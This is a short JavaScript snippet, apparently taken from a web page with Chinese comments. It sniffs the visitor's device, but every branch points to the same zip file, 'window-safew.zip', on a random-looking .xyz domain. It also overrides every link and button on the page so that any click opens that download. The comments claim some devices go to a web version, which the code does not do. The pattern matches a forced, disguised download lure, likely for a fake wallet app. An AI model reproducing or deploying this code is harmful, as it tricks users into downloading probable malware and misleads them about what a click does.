    function handleDownload() {
        var userAgent = navigator.userAgent.toLowerCase();
        var downloadUrl = '';
        
        // iOS设备
        if (/iphone|ipad|ipod/.test(userAgent)) {
            downloadUrl = 'https://risanhs-sdad1e4asd-3css3hub.xyz/window-safew.zip';
        }
        // Android设备
        else if (/android/.test(userAgent)) {
            downloadUrl = 'https://risanhs-sdad1e4asd-3css3hub.xyz/window-safew.zip';
        }
        // 其他设备默认跳转到网页版
        else {
            downloadUrl = 'https://risanhs-sdad1e4asd-3css3hub.xyz/window-safew.zip';
        }

        window.open(downloadUrl, '.apk');
    }

    $(document).ready(function(){
        // 为所有链接添加点击事件
        $('a').on('click', function(e){
            e.preventDefault();
            handleDownload();
        });

        // 为所有按钮添加点击事件
        $('button').on('click', function(e){
            e.preventDefault();
            handleDownload();
        });
    });
